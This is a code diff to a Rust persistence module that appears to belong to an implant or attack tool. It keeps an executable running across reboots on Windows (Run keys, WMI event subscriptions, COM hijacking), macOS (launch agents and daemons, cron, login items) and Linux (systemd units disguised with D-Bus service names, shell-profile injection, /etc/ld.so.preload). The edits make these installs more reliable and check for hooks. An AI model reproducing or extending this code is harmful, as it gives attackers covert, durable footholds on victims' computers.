@@ -441,7 +441,7 @@ pub mod windows {
                     ));
                 }
             }
-            log::info!(
+            tracing::info!(
                 "RegistryRunKey::install: set '{}' = '{}'",
                 self.value_name,
                 val_str
@@ -483,7 +483,7 @@ pub mod windows {
                 reg_del(hkey, val_name.as_ptr());
                 reg_close(hkey);
             }
-            log::info!("RegistryRunKey::remove: deleted '{}'", self.value_name);
+            tracing::info!("RegistryRunKey::remove: deleted '{}'", self.value_name);
             Ok(())
         }
 
@@ -538,7 +538,8 @@ pub mod windows {
     // We define only the vtable slots we need.  Layout must match the real
     // COM vtables on every version of Windows; these match the MSDN/SDK
     // definitions exactly.
-    use crate::win_types::{IUnknown, IUnknownVtbl, BSTR, REFIID, VARIANT};
+    use crate::win_types::{IUnknown, IUnknownVtbl, BSTR, REFIID};
+    use windows_sys::Win32::System::Variant::VARIANT;
 
     // IWbemClassObject (partial vtable – only Put and Release are used)
     #[repr(C)]
@@ -860,7 +861,7 @@ pub mod windows {
         /// Create a new zeroed ComVariant.
         fn new() -> Self {
             Self {
-                var: VARIANT::default(),
+                var: unsafe { std::mem::zeroed() },
                 cleared: false,
             }
         }
@@ -1012,7 +1013,7 @@ pub mod windows {
         for &idx in &[0usize, 1, 2, 16] {
             let entry = vtbl.add(idx).read();
             if entry == 0 {
-                log::warn!(
+                tracing::warn!(
                     "WmiSubscription: vtable[{}] is null; IWbemClassObject layout mismatch",
                     idx
                 );
@@ -1035,7 +1036,7 @@ pub mod windows {
         let ok16 = get_module_handle_ex(flags, entry_16 as *const _, &mut hmod_16);
 
         if ok0 == 0 || ok16 == 0 {
-            log::warn!(
+            tracing::warn!(
                 "WmiSubscription: GetModuleHandleExW failed for vtable entries (ok0={}, ok16={}); \
                  cannot verify SpawnInstance location",
                 ok0,
@@ -1045,7 +1046,7 @@ pub mod windows {
         }
 
         if hmod_0 != hmod_16 {
-            log::warn!(
+            tracing::warn!(
                 "WmiSubscription: vtable[0] ({:p}) and vtable[16] ({:p}) are in different \
                  modules; possible hook detected — refusing hardcoded SpawnInstance index",
                 hmod_0,
@@ -1091,7 +1092,7 @@ pub mod windows {
             // class_bstr drops here
 
             if !succeeded(hr) {
-                log::warn!(
+                tracing::warn!(
                     "WmiSubscription: GetObject({}) attempt {} failed: 0x{:08X}",
                     class_name,
                     attempt + 1,
@@ -1108,14 +1109,14 @@ pub mod windows {
                     ((*(*class_obj).lpvtbl).release)(class_obj);
 
                     if succeeded(hr) && !inst.is_null() {
-                        log::debug!(
+                        tracing::debug!(
                             "WmiSubscription: SpawnInstance({}) succeeded on attempt {}",
                             class_name,
                             attempt + 1
                         );
                         return Ok(inst);
                     }
-                    log::warn!(
+                    tracing::warn!(
                         "WmiSubscription: SpawnInstance({}) attempt {} failed: 0x{:08X}",
                         class_name,
                         attempt + 1,
@@ -1127,7 +1128,7 @@ pub mod windows {
                 }
                 None => {
                     ((*(*class_obj).lpvtbl).release)(class_obj);
-                    log::warn!(
+                    tracing::warn!(
                         "WmiSubscription: vtable validation failed for {} on attempt {}",
                         class_name,
                         attempt + 1
@@ -1274,7 +1275,7 @@ pub mod windows {
         let filter_inst = match spawn_instance_with_retry(services_ptr, "__EventFilter") {
             Ok(inst) => inst,
             Err(e) => {
-                log::warn!(
+                tracing::warn!(
                     "WmiSubscription: SpawnInstance(__EventFilter) failed ({}), \
                      trying GetObject-by-path fallback",
                     e
@@ -1321,7 +1322,7 @@ pub mod windows {
         ) {
             Ok(inst) => inst,
             Err(e) => {
-                log::warn!(
+                tracing::warn!(
                     "WmiSubscription: SpawnInstance(CommandLineEventConsumer) failed ({}), \
                      trying GetObject-by-path fallback",
                     e
@@ -1366,7 +1367,7 @@ pub mod windows {
         ) {
             Ok(inst) => inst,
             Err(e) => {
-                log::warn!(
+                tracing::warn!(
                     "WmiSubscription: SpawnInstance(__FilterToConsumerBinding) failed ({}), \
                      trying GetObject-by-path fallback",
                     e
@@ -1598,7 +1599,7 @@ pub mod windows {
                 // path_bstr drops here
 
                 if !succeeded(del_hr) {
-                    log::warn!(
+                    tracing::warn!(
                         "WmiSubscription::remove: DeleteInstance('{}') failed: 0x{:08X}",
                         path_str,
                         del_hr
@@ -1698,7 +1699,7 @@ pub mod windows {
             const COINIT_MULTITHREADED: u32 = 0x0;
 
             let exe_path = executable_path.to_string_lossy();
-            log::info!(
+            tracing::info!(
                 "WmiSubscription::install: registering '{}' for '{}'",
                 self.subscription_name,
                 exe_path
@@ -1733,7 +1734,7 @@ pub mod windows {
                     ));
                 }
                 if hr == RPC_E_CHANGED_MODE {
-                    log::debug!(
+                    tracing::debug!(
                         "WmiSubscription::install: COM already initialised in a different \
                          apartment (RPC_E_CHANGED_MODE); proceeding without owning COM lifetime"
                     );
@@ -1741,7 +1742,7 @@ pub mod windows {
 
                 let result = wmi_install_com(&self.subscription_name, exe_path.as_ref());
                 if let Err(ref e) = result {
-                    log::error!(
+                    tracing::error!(
                         "WmiSubscription::install: all COM approaches failed ({})",
                         e
                     );
@@ -1751,7 +1752,7 @@ pub mod windows {
                 }
                 result?;
 
-                log::info!("WmiSubscription::install: registered successfully");
+                tracing::info!("WmiSubscription::install: registered successfully");
             }
             Ok(())
         }
@@ -1784,14 +1785,14 @@ pub mod windows {
 
                 let result = wmi_remove_com(&self.subscription_name);
                 if let Err(ref e) = result {
-                    log::warn!("WmiSubscription::remove: COM path failed ({})", e);
+                    tracing::warn!("WmiSubscription::remove: COM path failed ({})", e);
                 }
                 if should_uninitialize {
                     co_uninit();
                 }
                 result?;
             }
-            log::info!(
+            tracing::info!(
                 "WmiSubscription::remove: removed '{}'",
                 self.subscription_name
             );
@@ -1924,7 +1925,7 @@ pub mod windows {
                 );
                 reg_close(hkey);
             }
-            log::info!(
+            tracing::info!(
                 "ComHijacking::install: CLSID {} → '{}'",
                 self.clsid,
                 executable_path.display()
@@ -1946,7 +1947,7 @@ pub mod windows {
                         })?;
                 reg_delete_tree(HKEY_CURRENT_USER, subkey.as_ptr());
             }
-            log::info!("ComHijacking::remove: removed CLSID {}", self.clsid);
+            tracing::info!("ComHijacking::remove: removed CLSID {}", self.clsid);
             Ok(())
         }
 
@@ -2002,14 +2003,14 @@ pub mod windows {
                 .ok_or_else(|| anyhow!("StartupFolder: no config dir"))?;
             std::fs::copy(executable_path, &target)
                 .map_err(|e| anyhow!("StartupFolder::install: copy failed: {}", e))?;
-            log::info!("StartupFolder::install: copied to '{}'", target.display());
+            tracing::info!("StartupFolder::install: copied to '{}'", target.display());
             Ok(())
         }
 
         fn remove(&self) -> Result<()> {
             if let Some(target) = self.startup_path() {
                 let _ = std::fs::remove_file(&target);
-                log::info!("StartupFolder::remove: removed '{}'", target.display());
+                tracing::info!("StartupFolder::remove: removed '{}'", target.display());
             }
             Ok(())
         }
@@ -2040,12 +2041,12 @@ pub mod windows {
                 }
                 Ok(false) => {
                     let msg = "RegistryRunKey install verification failed".to_string();
-                    log::warn!("{}", msg);
+                    tracing::warn!("{}", msg);
                     failures.push(msg);
                 }
                 Err(e) => {
                     let msg = format!("RegistryRunKey install failed: {}", e);
-                    log::warn!("{}", msg);
+                    tracing::warn!("{}", msg);
                     failures.push(msg);
                 }
             }
@@ -2059,12 +2060,12 @@ pub mod windows {
                 }
                 Ok(false) => {
                     let msg = "StartupFolder install verification failed".to_string();
-                    log::warn!("{}", msg);
+                    tracing::warn!("{}", msg);
                     failures.push(msg);
                 }
                 Err(e) => {
                     let msg = format!("StartupFolder install failed: {}", e);
-                    log::warn!("{}", msg);
+                    tracing::warn!("{}", msg);
                     failures.push(msg);
                 }
             }
@@ -2078,12 +2079,12 @@ pub mod windows {
                 }
                 Ok(false) => {
                     let msg = "WmiSubscription install verification failed".to_string();
-                    log::warn!("{}", msg);
+                    tracing::warn!("{}", msg);
                     failures.push(msg);
                 }
                 Err(e) => {
                     let msg = format!("WmiSubscription install failed: {}", e);
-                    log::warn!("{}", msg);
+                    tracing::warn!("{}", msg);
                     failures.push(msg);
                 }
             }
@@ -2104,7 +2105,7 @@ pub mod windows {
                      COM hijacking requires a cdylib build target",
                     exe.display()
                 );
-                log::warn!("{}", msg);
+                tracing::warn!("{}", msg);
                 failures.push(msg);
             } else {
                 let mech = ComHijacking::from_config(cfg);
@@ -2114,12 +2115,12 @@ pub mod windows {
                     }
                     Ok(false) => {
                         let msg = "ComHijacking install verification failed".to_string();
-                        log::warn!("{}", msg);
+                        tracing::warn!("{}", msg);
                         failures.push(msg);
                     }
                     Err(e) => {
                         let msg = format!("ComHijacking install failed: {}", e);
-                        log::warn!("{}", msg);
+                        tracing::warn!("{}", msg);
                         failures.push(msg);
                     }
                 }
@@ -2136,7 +2137,7 @@ pub mod windows {
             );
         }
         if !failures.is_empty() {
-            log::warn!(
+            tracing::warn!(
                 "persistence installed with partial failures: {}",
                 failures.join("; ")
             );
@@ -2288,16 +2289,37 @@ pub mod macos {
                         ));
                     }
                 } else {
-                    let status = std::process::Command::new("launchctl")
+                    let bootstrap = std::process::Command::new("launchctl")
                         .args(["bootstrap", &gui_domain, &plist_path.to_string_lossy()])
-                        .status()
+                        .output()
                         .map_err(|e| anyhow!("LaunchAgent::install: launchctl: {}", e))?;
-                    if !status.success() {
-                        // launchctl bootstrap returns 37 (ESRCH) when the service
-                        // is already loaded; treat that as a non-fatal warning.
-                        log::warn!(
-                            "LaunchAgent::install: launchctl bootstrap returned non-zero (service may already be loaded)"
-                        );
+                    if !bootstrap.status.success() {
+                        let stderr = String::from_utf8_lossy(&bootstrap.stderr)
+                            .trim()
+                            .to_string();
+                        // launchctl bootstrap returns 37 (ESRCH / Bootstrap
+                        // already loaded) when the service is already loaded.
+                        // Treat that specific case as success since the plist
+                        // IS loaded in launchd.
+                        let already_loaded = bootstrap.status.code() == Some(37)
+                            || stderr.contains("already loaded")
+                            || stderr.contains("Bootstrap") && stderr.contains("already");
+                        if already_loaded {
+                            tracing::info!(
+                                "LaunchAgent::install: launchctl bootstrap returned already-loaded (service was already loaded)"
+                            );
+                        } else {
+                            let detail = if stderr.is_empty() {
+                                format!("exit code {:?}", bootstrap.status.code())
+                            } else {
+                                stderr
+                            };
+                            return Err(anyhow!(
+                                "LaunchAgent::install: failed to bootstrap '{}' via launchctl: {}",
+                                plist_path.display(),
+                                detail
+                            ));
+                        }
                     }
                 }
             }
@@ -2307,7 +2329,7 @@ pub mod macos {
                     .args(["load", "-w", &plist_path.to_string_lossy()])
                     .status();
             }
-            log::info!("LaunchAgent::install: installed '{}'", plist_path.display());
+            tracing::info!("LaunchAgent::install: installed '{}'", plist_path.display());
             Ok(())
         }
 
@@ -2343,7 +2365,7 @@ pub mod macos {
                 .args(["unload", &plist_path.to_string_lossy()])
                 .status();
             let _ = std::fs::remove_file(&plist_path);
-            log::info!("LaunchAgent::remove: unloaded '{}'", self.label);
+            tracing::info!("LaunchAgent::remove: unloaded '{}'", self.label);
             Ok(())
         }
 
@@ -2356,20 +2378,30 @@ pub mod macos {
             if !plist_path.exists() {
                 return Ok(false);
             }
-            if self.asuser_bootstrap {
-                let uid = unsafe { libc::getuid() };
-                let service = format!("gui/{}/{}", uid, self.label);
-                let status = std::process::Command::new("launchctl")
+            // Verify the service is actually loaded in launchd, not just that
+            // the plist file exists on disk.  A stale or unloaded plist should
+            // not be reported as active persistence.
+            let uid = unsafe { libc::getuid() };
+            let service = format!("gui/{}/{}", uid, self.label);
+            let status = if self.asuser_bootstrap {
+                // Use asuser wrapper for GUI-session bootstrap verification.
+                std::process::Command::new("launchctl")
                     .arg("asuser")
                     .arg(uid.to_string())
                     .arg("launchctl")
                     .arg("print")
                     .arg(&service)
                     .status()
-                    .map_err(|e| anyhow!("LaunchAgent::verify: launchctl asuser print: {}", e))?;
-                return Ok(status.success());
-            }
-            Ok(true)
+                    .map_err(|e| anyhow!("LaunchAgent::verify: launchctl asuser print: {}", e))?
+            } else {
+                // Direct domain verification — the service must be loaded in
+                // the gui domain even when asuser_bootstrap is disabled.
+                std::process::Command::new("launchctl")
+                    .args(["print", &service])
+                    .status()
+                    .map_err(|e| anyhow!("LaunchAgent::verify: launchctl print: {}", e))?
+            };
+            Ok(status.success())
         }
     }
 
@@ -2408,7 +2440,7 @@ pub mod macos {
                     String::new()
                 }
                 Err(e) => {
-                    log::debug!("CronJob: crontab -l failed to execute: {e}");
+                    tracing::debug!("CronJob: crontab -l failed to execute: {e}");
                     String::new()
                 }
             }
@@ -2463,7 +2495,7 @@ pub mod macos {
             // Verify that the entry actually landed.  On macOS with SIP,
             // crontab writes may be silently discarded.
             if !Self::verify_cron_entry_present(executable_path) {
-                log::warn!(
+                tracing::warn!(
                     "CronJob::install: crontab -l does not contain the expected \
                      @reboot entry; SIP may be blocking cron modifications on this host"
                 );
@@ -2475,7 +2507,7 @@ pub mod macos {
                 ));
             }
 
-            log::info!("CronJob::install: crontab @reboot entry verified");
+            tracing::info!("CronJob::install: crontab @reboot entry verified");
             Ok(())
         }
 
@@ -2497,7 +2529,7 @@ pub mod macos {
                 if !status.success() {
                     // crontab -r returns non-zero when there is no crontab;
                     // that is not an error in the remove path.
-                    log::debug!("CronJob::remove: crontab -r exited non-zero (no crontab)");
+                    tracing::debug!("CronJob::remove: crontab -r exited non-zero (no crontab)");
                 }
             } else {
                 // Write back without our entry.
@@ -2518,7 +2550,7 @@ pub mod macos {
                     .map_err(|e| anyhow!("CronJob::remove: failed to wait for crontab: {e}"))?;
             }
 
-            log::info!("CronJob::remove: cron entry removed");
+            tracing::info!("CronJob::remove: cron entry removed");
             Ok(())
         }
 
@@ -2555,12 +2587,12 @@ pub mod macos {
                 }
                 Ok(false) => {
                     let msg = "LaunchAgent install verification failed".to_string();
-                    log::warn!("{}", msg);
+                    tracing::warn!("{}", msg);
                     failures.push(msg);
                 }
                 Err(e) => {
                     let msg = format!("LaunchAgent install failed: {}", e);
-                    log::warn!("{}", msg);
+                    tracing::warn!("{}", msg);
                     failures.push(msg);
                 }
             }
@@ -2574,12 +2606,12 @@ pub mod macos {
                 }
                 Ok(false) => {
                     let msg = "CronJob install verification failed".to_string();
-                    log::warn!("{}", msg);
+                    tracing::warn!("{}", msg);
                     failures.push(msg);
                 }
                 Err(e) => {
                     let msg = format!("CronJob install failed: {}", e);
-                    log::warn!("{}", msg);
+                    tracing::warn!("{}", msg);
                     failures.push(msg);
                 }
             }
@@ -2593,12 +2625,12 @@ pub mod macos {
                 }
                 Ok(false) => {
                     let msg = "LaunchDaemon install verification failed".to_string();
-                    log::warn!("{}", msg);
+                    tracing::warn!("{}", msg);
                     failures.push(msg);
                 }
                 Err(e) => {
                     let msg = format!("LaunchDaemon install failed: {}", e);
-                    log::warn!("{}", msg);
+                    tracing::warn!("{}", msg);
                     failures.push(msg);
                 }
             }
@@ -2612,12 +2644,12 @@ pub mod macos {
                 }
                 Ok(false) => {
                     let msg = "LoginItem install verification failed".to_string();
-                    log::warn!("{}", msg);
+                    tracing::warn!("{}", msg);
                     failures.push(msg);
                 }
                 Err(e) => {
                     let msg = format!("LoginItem install failed: {}", e);
-                    log::warn!("{}", msg);
+                    tracing::warn!("{}", msg);
                     failures.push(msg);
                 }
             }
@@ -2633,7 +2665,7 @@ pub mod macos {
             );
         }
         if !failures.is_empty() {
-            log::warn!(
+            tracing::warn!(
                 "persistence installed with partial failures: {}",
                 failures.join("; ")
             );
@@ -2676,6 +2708,8 @@ pub mod macos {
                     return Err(anyhow!("LaunchDaemon::install: requires root"));
                 }
             }
+            let label_escaped = xml_escape(&self.label);
+            let exe_escaped = xml_escape(&executable_path.to_string_lossy());
             let plist = format!(
                 r#"<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -2697,8 +2731,8 @@ pub mod macos {
     <string>/dev/null</string>
 </dict>
 </plist>"#,
-                label = self.label,
-                exe = executable_path.display()
+                label = label_escaped,
+                exe = exe_escaped
             );
             let daemons_dir = std::path::Path::new("/Library/LaunchDaemons");
             std::fs::create_dir_all(daemons_dir)
@@ -2708,11 +2742,18 @@ pub mod macos {
                 .map_err(|e| anyhow!("LaunchDaemon::install: write: {}", e))?;
             #[cfg(target_os = "macos")]
             {
-                let _ = std::process::Command::new("launchctl")
+                let status = std::process::Command::new("launchctl")
                     .args(["bootstrap", "system", &plist_path.to_string_lossy()])
-                    .status();
+                    .status()
+                    .map_err(|e| anyhow!("LaunchDaemon::install: launchctl exec failed: {}", e))?;
+                if !status.success() {
+                    return Err(anyhow!(
+                        "LaunchDaemon::install: launchctl bootstrap failed with exit code {:?}",
+                        status.code()
+                    ));
+                }
             }
-            log::info!(
+            tracing::info!(
                 "LaunchDaemon::install: installed '{}'",
                 plist_path.display()
             );
@@ -2729,7 +2770,7 @@ pub mod macos {
                     .status();
             }
             let _ = std::fs::remove_file(&plist_path);
-            log::info!("LaunchDaemon::remove: removed '{}'", self.label);
+            tracing::info!("LaunchDaemon::remove: removed '{}'", self.label);
             Ok(())
         }
 
@@ -2751,7 +2792,7 @@ pub mod macos {
                     // stdout means it is not currently loaded.
                     let stdout = String::from_utf8_lossy(&output.stdout).trim().to_string();
                     if stdout.is_empty() {
-                        log::warn!(
+                        tracing::warn!(
                             "LaunchDaemon::verify: plist exists but service not loaded"
                         );
                         return Ok(false);
@@ -2960,7 +3001,7 @@ pub mod macos {
                 match Self::sm_set_enabled_via_app_service(helper_bundle_id, enabled) {
                     Ok(()) => return Ok(()),
                     Err(e) => {
-                        log::warn!(
+                        tracing::warn!(
                             "LoginItem: SMAppService path failed ({}); falling back to SMLoginItemSetEnabled",
                             e
                         );
@@ -3019,7 +3060,7 @@ pub mod macos {
                     helper_bundle_id
                 ));
             }
-            log::info!(
+            tracing::info!(
                 "LoginItem: servicectl {} '{}' succeeded",
                 action,
                 helper_bundle_id
@@ -3065,7 +3106,7 @@ pub mod macos {
 
         fn install_via_service_management(&self, ctx: &SmHelperContext) -> Result<()> {
             Self::sm_set_enabled(&ctx.helper_bundle_id, true)?;
-            log::info!(
+            tracing::info!(
                 "LoginItem::install: enabled ServiceManagement helper '{}' from '{}'",
                 ctx.helper_bundle_id,
                 ctx.helper_bundle_path.display()
@@ -3075,7 +3116,7 @@ pub mod macos {
 
         fn remove_via_service_management(&self, ctx: &SmHelperContext) -> Result<()> {
             Self::sm_set_enabled(&ctx.helper_bundle_id, false)?;
-            log::info!(
+            tracing::info!(
                 "LoginItem::remove: disabled ServiceManagement helper '{}'",
                 ctx.helper_bundle_id
             );
@@ -3114,7 +3155,7 @@ end tell"#
             );
 
             Self::run_osascript(&script)?;
-            log::info!(
+            tracing::info!(
                 "LoginItem::install: registered System Events login item '{}' -> '{}'",
                 self.app_name,
                 canonical_exe.display()
@@ -3133,7 +3174,7 @@ end tell"#
             );
 
             Self::run_osascript(&script)?;
-            log::info!(
+            tracing::info!(
                 "LoginItem::remove: removed System Events login item '{}'",
                 self.app_name
             );
@@ -3267,7 +3308,11 @@ pub mod linux {
 
     impl Persist for SystemdService {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
-            let exe = executable_path.to_string_lossy();
+            let exe_raw = executable_path.to_string_lossy();
+            // Quote the path so paths containing spaces or special
+            // characters do not break the ExecStart= line.  systemd
+            // supports single-quoted values in ExecStart.
+            let exe = shell_quote_single(&exe_raw);
             let unit = format!(
                 "[Unit]\nDescription=D-Bus User Session Proxy\nAfter=default.target\n\n\
                 [Service]\nType=simple\nExecStart={exe}\nRestart=always\nRestartSec=10\n\n\
@@ -3286,7 +3331,7 @@ pub mod linux {
                 .status()
                 .map_err(|e| anyhow!("SystemdService: daemon-reload: {}", e))?;
             if !reload.success() {
-                log::warn!("SystemdService::install: daemon-reload returned non-zero");
+                tracing::warn!("SystemdService::install: daemon-reload returned non-zero");
             }
             let enable = std::process::Command::new("systemctl")
                 .args(["--user", "enable", "--now", &self.service_name])
@@ -3298,7 +3343,7 @@ pub mod linux {
                     self.service_name
                 ));
             }
-            log::info!("SystemdService::install: enabled '{}'", self.service_name);
+            tracing::info!("SystemdService::install: enabled '{}'", self.service_name);
             Ok(())
         }
 
@@ -3314,7 +3359,7 @@ pub mod linux {
             let _ = std::process::Command::new("systemctl")
                 .args(["--user", "daemon-reload"])
                 .status();
-            log::info!("SystemdService::remove: removed '{}'", self.service_name);
+            tracing::info!("SystemdService::remove: removed '{}'", self.service_name);
             Ok(())
         }
 
@@ -3362,7 +3407,7 @@ pub mod linux {
             if !out.success() {
                 return Err(anyhow!("CronJob::install: crontab command failed"));
             }
-            log::info!("CronJob::install: added @reboot entry for '{}'", exe);
+            tracing::info!("CronJob::install: added @reboot entry for '{}'", exe);
             Ok(())
         }
 
@@ -3376,7 +3421,7 @@ pub mod linux {
                 ))
                 .status()
                 .map_err(|e| anyhow!("CronJob::remove: {}", e))?;
-            log::info!("CronJob::remove: removed managed @reboot entries");
+            tracing::info!("CronJob::remove: removed managed @reboot entries");
             Ok(())
         }
 
@@ -3424,7 +3469,7 @@ pub mod linux {
                 if path.exists() {
                     let existing = std::fs::read_to_string(&path).unwrap_or_default();
                     if existing.contains(SHELL_MARKER_BEGIN) {
-                        log::debug!(
+                        tracing::debug!(
                             "ShellProfile::install: already present in '{}'",
                             profile_name
                         );
@@ -3436,13 +3481,31 @@ pub mod linux {
                         .map_err(|e| {
                             anyhow!("ShellProfile::install: open '{}': {}", profile_name, e)
                         })?;
-                    writeln!(
-                        file,
-                        "\n{}\n({} &) 2>/dev/null\n{}",
-                        SHELL_MARKER_BEGIN, exe, SHELL_MARKER_END
-                    )
-                    .map_err(|e| anyhow!("ShellProfile::install: write: {}", e))?;
-                    log::info!("ShellProfile::install: appended to '{}'", path.display());
+                    // Quote the executable path to handle spaces and
+                    // special characters in the path.
+                    let quoted_exe = shell_quote_single(&exe);
+                    // Fish uses different syntax from POSIX shells:
+                    //   POSIX: (cmd &) 2>/dev/null   — subshell + background
+                    //   Fish:  cmd &>/dev/null &     — no subshell, &> redirect, & background
+                    // Using POSIX syntax in config.fish silently breaks because
+                    // `(...)` in fish is command substitution (captures output),
+                    // not a subshell.
+                    if profile_name.contains("fish") {
+                        writeln!(
+                            file,
+                            "\n{}\n{} &>/dev/null &\n{}",
+                            SHELL_MARKER_BEGIN, quoted_exe, SHELL_MARKER_END
+                        )
+                        .map_err(|e| anyhow!("ShellProfile::install: write: {}", e))?;
+                    } else {
+                        writeln!(
+                            file,
+                            "\n{}\n({} &) 2>/dev/null\n{}",
+                            SHELL_MARKER_BEGIN, quoted_exe, SHELL_MARKER_END
+                        )
+                        .map_err(|e| anyhow!("ShellProfile::install: write: {}", e))?;
+                    }
+                    tracing::info!("ShellProfile::install: appended to '{}'", path.display());
                     return Ok(());
                 }
             }
@@ -3456,7 +3519,7 @@ pub mod linux {
                 Some(h) => h,
                 None => return Ok(()),
             };
-            for profile_name in &[".zshrc", ".bashrc", ".profile", ".bash_profile"] {
+            for profile_name in &[".zshrc", ".bashrc", ".profile", ".bash_profile", ".config/fish/config.fish"] {
                 let path = home.join(profile_name);
                 if !path.exists() {
                     continue;
@@ -3466,7 +3529,7 @@ pub mod linux {
                     let _ = std::fs::write(&path, filtered);
                 }
             }
-            log::info!("ShellProfile::remove: removed persistence entries");
+            tracing::info!("ShellProfile::remove: removed persistence entries");
             Ok(())
         }
 
@@ -3475,7 +3538,7 @@ pub mod linux {
                 Some(h) => h,
                 None => return Ok(false),
             };
-            for profile_name in &[".zshrc", ".bashrc", ".profile", ".bash_profile"] {
+            for profile_name in &[".zshrc", ".bashrc", ".profile", ".bash_profile", ".config/fish/config.fish"] {
                 let path = home.join(profile_name);
                 if let Ok(content) = std::fs::read_to_string(&path) {
                     if content.contains(SHELL_MARKER_BEGIN) || content.contains("# system-update-")
@@ -3509,12 +3572,12 @@ pub mod linux {
                 }
                 Ok(false) => {
                     let msg = "SystemdService install verification failed".to_string();
-                    log::warn!("{}", msg);
+                    tracing::warn!("{}", msg);
                     failures.push(msg);
                 }
                 Err(e) => {
                     let msg = format!("SystemdService install failed: {}", e);
-                    log::warn!("{}", msg);
+                    tracing::warn!("{}", msg);
                     failures.push(msg);
                 }
             }
@@ -3528,12 +3591,12 @@ pub mod linux {
                 }
                 Ok(false) => {
                     let msg = "CronJob install verification failed".to_string();
-                    log::warn!("{}", msg);
+                    tracing::warn!("{}", msg);
                     failures.push(msg);
                 }
                 Err(e) => {
                     let msg = format!("CronJob install failed: {}", e);
-                    log::warn!("{}", msg);
+                    tracing::warn!("{}", msg);
                     failures.push(msg);
                 }
             }
@@ -3547,12 +3610,12 @@ pub mod linux {
                 }
                 Ok(false) => {
                     let msg = "ShellProfile install verification failed".to_string();
-                    log::warn!("{}", msg);
+                    tracing::warn!("{}", msg);
                     failures.push(msg);
                 }
                 Err(e) => {
                     let msg = format!("ShellProfile install failed: {}", e);
-                    log::warn!("{}", msg);
+                    tracing::warn!("{}", msg);
                     failures.push(msg);
                 }
             }
@@ -3568,7 +3631,7 @@ pub mod linux {
             );
         }
         if !failures.is_empty() {
-            log::warn!(
+            tracing::warn!(
                 "persistence installed with partial failures: {}",
                 failures.join("; ")
             );
@@ -3605,7 +3668,10 @@ pub mod linux {
             if unsafe { libc::getuid() } != 0 {
                 return Err(anyhow!("SystemdSystemService::install: requires root"));
             }
-            let exe = executable_path.to_string_lossy();
+            let exe_raw = executable_path.to_string_lossy();
+            // Quote the path so paths containing spaces or special
+            // characters do not break the ExecStart= line.
+            let exe = shell_quote_single(&exe_raw);
             let unit = format!(
                 "[Unit]\nDescription=D-Bus Broker Daemon\nAfter=network.target\n\n\
                 [Service]\nType=simple\nExecStart={exe}\nRestart=always\nRestartSec=10\n\
@@ -3617,13 +3683,24 @@ pub mod linux {
             let unit_path = unit_dir.join(format!("{}.service", self.service_name));
             std::fs::write(&unit_path, unit)
                 .map_err(|e| anyhow!("SystemdSystemService: write: {}", e))?;
-            let _ = std::process::Command::new("systemctl")
+            let reload = std::process::Command::new("systemctl")
                 .args(["daemon-reload"])
-                .status();
-            let _ = std::process::Command::new("systemctl")
+                .status()
+                .map_err(|e| anyhow!("SystemdSystemService: daemon-reload: {}", e))?;
+            if !reload.success() {
+                tracing::warn!("SystemdSystemService::install: daemon-reload returned non-zero");
+            }
+            let enable = std::process::Command::new("systemctl")
                 .args(["enable", "--now", &self.service_name])
-                .status();
-            log::info!(
+                .status()
+                .map_err(|e| anyhow!("SystemdSystemService: enable --now: {}", e))?;
+            if !enable.success() {
+                return Err(anyhow!(
+                    "SystemdSystemService::install: enable --now '{}' failed",
+                    self.service_name
+                ));
+            }
+            tracing::info!(
                 "SystemdSystemService::install: enabled '{}'",
                 self.service_name
             );
@@ -3640,7 +3717,7 @@ pub mod linux {
             let _ = std::process::Command::new("systemctl")
                 .args(["daemon-reload"])
                 .status();
-            log::info!(
+            tracing::info!(
                 "SystemdSystemService::remove: removed '{}'",
                 self.service_name
             );
@@ -3714,7 +3791,7 @@ pub mod linux {
                     let _ = std::os::unix::fs::symlink(&script_path, &link);
                 }
             }
-            log::info!("InitScript::install: installed '{}'", script_path.display());
+            tracing::info!("InitScript::install: installed '{}'", script_path.display());
             Ok(())
         }
 
@@ -3727,7 +3804,7 @@ pub mod linux {
             }
             let _ =
                 std::fs::remove_file(std::path::Path::new("/etc/init.d").join(&self.script_name));
-            log::info!("InitScript::remove: removed '{}'", self.script_name);
+            tracing::info!("InitScript::remove: removed '{}'", self.script_name);
             Ok(())
         }
 
@@ -3760,7 +3837,7 @@ pub mod linux {
             // Read existing contents and check for duplicate entry.
             let existing = std::fs::read_to_string(preload_file).unwrap_or_default();
             if existing.lines().any(|l| l.trim() == path.as_ref()) {
-                log::debug!("LdPreload::install: entry already present");
+                tracing::debug!("LdPreload::install: entry already present");
                 return Ok(());
             }
             let mut file = std::fs::OpenOptions::new()
@@ -3769,7 +3846,7 @@ pub mod linux {
                 .open(preload_file)
                 .map_err(|e| anyhow!("LdPreload::install: open: {}", e))?;
             writeln!(file, "{}", path).map_err(|e| anyhow!("LdPreload::install: write: {}", e))?;
-            log::info!("LdPreload::install: added '{}' to /etc/ld.so.preload", path);
+            tracing::info!("LdPreload::install: added '{}' to /etc/ld.so.preload", path);
             Ok(())
         }
 
@@ -3787,7 +3864,7 @@ pub mod linux {
                 .map(|l| format!("{}\n", l))
                 .collect();
             let _ = std::fs::write(preload_file, filtered);
-            log::info!("LdPreload::remove: removed entry from /etc/ld.so.preload");
+            tracing::info!("LdPreload::remove: removed entry from /etc/ld.so.preload");
             Ok(())
         }
 
